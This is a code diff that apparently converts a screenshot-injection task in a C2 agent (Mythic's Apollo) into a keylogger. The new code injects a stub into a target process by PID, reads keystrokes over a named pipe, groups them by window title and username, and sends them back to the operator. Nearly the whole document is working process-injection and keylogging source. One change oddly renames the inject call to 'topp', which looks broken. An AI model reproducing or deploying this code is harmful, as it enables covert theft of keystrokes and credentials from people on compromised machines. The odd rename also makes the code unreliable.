@@ -1,12 +1,13 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define SCREENSHOT_INJECT
+#define KEYLOG_INJECT
 #endif
 
-#if SCREENSHOT_INJECT
+#if KEYLOG_INJECT
 
 using Interop.Classes;
+using Interop.Classes.Collections;
 using Interop.Classes.Core;
 using Interop.Classes.Events;
 using Interop.Enums.ApolloEnums;
@@ -26,17 +27,13 @@ using ST = System.Threading.Tasks;
 
 namespace Tasks
 {
-    public class screenshot_inject : Tasking
+    public class keylog_inject : Tasking
     {
         [DataContract]
-        internal struct ScreenshotInjectParameters
+        internal struct KeylogInjectParameters
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
-            [DataMember(Name = "count")]
-            public int Count;
-            [DataMember(Name = "interval")]
-            public int Interval;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
             [DataMember(Name = "pid")]
@@ -49,68 +46,70 @@ namespace Tasks
         private AutoResetEvent _pipeConnected = new AutoResetEvent(false);
 
         private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
         private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
         private ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
         private JsonSerializer _serializer = new JsonSerializer();
         private AutoResetEvent _complete = new AutoResetEvent(false);
-        private Action<object> _sendAction;
-        private Action<object> _putFilesAction;
+        private Action<object> _putKeylogsAction;
         List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();
 
         private bool _completed = false;
 
-        public screenshot_inject(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public keylog_inject(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
-            _sendAction = (object p) =>
+            _putKeylogsAction = (object p) =>
             {
                 PipeStream ps = (PipeStream)p;
-                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
+                WaitHandle[] waiters = new WaitHandle[] { _cancellationToken.Token.WaitHandle, _complete };
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
-                    WaitHandle.WaitAny(new WaitHandle[]
+                    WaitHandle.WaitAny(waiters, 10000);
+                    KeylogInformation[] keylogs = _keylogs.Flush();
+                    if (keylogs.Length > 0)
                     {
-                    _senderEvent,
-                    _cancellationToken.Token.WaitHandle,
-                    _complete
-                    });
-                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
-                    {
-                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
-                    }
-                }
-                _completed = true;
-                _complete.Set();
-            };
-            _putFilesAction = (object p) =>
-            {
-                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle };
-                while (!_cancellationToken.IsCancellationRequested )
-                {
-                    WaitHandle.WaitAny(waiters);
-                    if (_putFilesQueue.TryDequeue(out byte[] screen))
-                    {
-                        ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
+                        bool found = false;
+                        List<KeylogInformation> aggregated = new List<KeylogInformation>();
+                        aggregated.Add(new KeylogInformation {
+                            WindowTitle = keylogs[0].WindowTitle,
+                            Username = keylogs[0].Username,
+                            Keystrokes = keylogs[0].Keystrokes
+                        });
+                        for (int i = 1; i < keylogs.Length; i++)
                         {
-                            if (_agent.GetFileManager().PutFile(
-                                _cancellationToken.Token,
-                                _data.ID,
-                                screen,
-                                null,
-                                out string mythicFileId,
-                                true))
+                            for(int j = 0; j < aggregated.Count; j++)
                             {
-                                return true;
-                            } else
-                            {
-                                return false;
+                                if (aggregated[j].WindowTitle == keylogs[i].WindowTitle && aggregated[j].Username == keylogs[i].Username)
+                                {
+                                    KeylogInformation update = aggregated[j];
+                                    update.Keystrokes += keylogs[i].Keystrokes;
+                                    aggregated[j] = update;
+                                    found = true;
+                                    break;
+                                }
                             }
-                        }, _cancellationToken.Token);
-                        uploadTasks.Add(uploadTask);
-                        uploadTask.Start();
+                            if (!found)
+                            {
+                                aggregated.Add(new KeylogInformation
+                                {
+                                    WindowTitle = keylogs[i].WindowTitle,
+                                    Username = keylogs[i].Username,
+                                    Keystrokes = keylogs[i].Keystrokes
+                                });
+                            }
+                            found = false;
+                        }
+                        _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
+                        {
+                            TaskID = _data.ID,
+                            Keylogs = aggregated.ToArray(),
+                            UserOutput = _jsonSerializer.Serialize(aggregated.ToArray())
+                        });
                     }
                 }
+                ps.Close();
             };
         }
-
 
 
         public override void Start()
@@ -118,7 +117,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
+                KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -146,7 +145,7 @@ namespace Tasks
                                 out byte[] exeAsmPic))
                         {
                             var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                            if (injector.Inject())
+                            if (injector.topp())
                             {
                                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                     "",
@@ -157,53 +156,19 @@ namespace Tasks
                                         Artifact.ProcessInject(parameters.PID,
                                             _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                     }));
-                                int count = 1;
-                                int interval = 0;
-                                if (parameters.Count > 0)
-                                {
-                                    count = parameters.Count;
-                                }
-
-                                if (parameters.Interval >= 0)
-                                {
-                                    interval = parameters.Interval;
-                                }
-
-                                IPCCommandArguments cmdargs = new IPCCommandArguments
-                                {
-                                    ByteData = new byte[0],
-                                    StringData = string.Format("{0} {1}", count, interval)
-                                };
                                 AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                 client.ConnectionEstablished += Client_ConnectionEstablished;
                                 client.MessageReceived += OnAsyncMessageReceived;
                                 client.Disconnect += Client_Disconnect;
-                                if (client.Connect(10000))
+                                if (client.Connect(3000))
                                 {
-                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                    foreach (IPCChunkedData chunk in chunks)
-                                    {
-                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-                                    }
-
-                                    _senderEvent.Set();
                                     WaitHandle[] waiters = new WaitHandle[]
                                     {
                                         _complete,
                                         _cancellationToken.Token.WaitHandle
                                     };
                                     WaitHandle.WaitAny(waiters);
-                                    ST.Task.WaitAll(uploadTasks.ToArray());
-                                    //bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
-                                    bool bRet = uploadTasks.All(t => t.Result is true);
-                                    if (bRet)
-                                    {
-                                        resp = CreateTaskResponse("", true, "completed");
-                                    }
-                                    else
-                                    {
-                                        resp = CreateTaskResponse("", true, "error");
-                                    }
+                                    resp = CreateTaskResponse("", true, "completed");
                                 }
                                 else
                                 {
@@ -212,7 +177,7 @@ namespace Tasks
                             }
                             else
                             {
-                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
+                                resp = CreateTaskResponse($"Failed to topp into PID {parameters.PID}", true, "error");
                             }
                         }
                         else
@@ -243,27 +208,13 @@ namespace Tasks
         private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
         {
             e.Pipe.Close();
-            _senderEvent.Set();
+            _completed = true;
+            _complete.Set();
         }
 
         private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
-            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
-            System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _cancellationToken.Token);
-        }
-
-        private void OnAsyncMessageSent(IAsyncResult result)
-        {
-            PipeStream pipe = (PipeStream)result.AsyncState;
-            // Potentially delete this since theoretically the sender Task does everything
-            if (pipe.IsConnected)
-            {
-                pipe.EndWrite(result);
-                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
-                {
-                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
-                }
-            }
+            System.Threading.Tasks.Task.Factory.StartNew(_putKeylogsAction, e.Pipe, _cancellationToken.Token);
         }
 
         private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
@@ -294,12 +245,11 @@ namespace Tasks
             IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
             //Console.WriteLine("We got a message: {0}", mt.ToString());
 
-            if (msg.GetTypeCode() != MessageType.ScreenshotInformation)
+            if (msg.GetTypeCode() != MessageType.KeylogInformation)
             {
                 throw new Exception("Invalid type received from the named pipe!");
             }
-            _putFilesQueue.Enqueue(((ScreenshotInformation)msg).Data);
-            _putFilesEvent.Set();
+            _keylogs.Add((KeylogInformation)msg);
         }
     }
 }
